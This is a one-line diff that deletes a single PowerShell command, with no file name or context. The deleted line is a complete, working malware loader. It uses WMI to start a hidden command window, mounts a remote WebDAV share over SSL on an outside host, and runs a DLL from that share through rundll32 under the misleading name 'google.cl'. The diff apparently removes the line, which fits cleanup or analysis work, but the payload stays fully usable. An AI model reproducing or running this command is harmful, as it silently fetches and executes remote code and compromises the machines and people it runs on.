@@ -1,1 +1,0 @@
-$si=([wmiclass]'Win32_ProcessStartup').CreateInstance();$si.ShowWindow=0;([wmiclass]'Win32_Process').Create('cmd /c pushd \\xvc.motorbook.xyz@SSL\f553f21c-c901-47ba-9c99-529b4de5244d & rundll32 google.cl,#1',$null,$si)
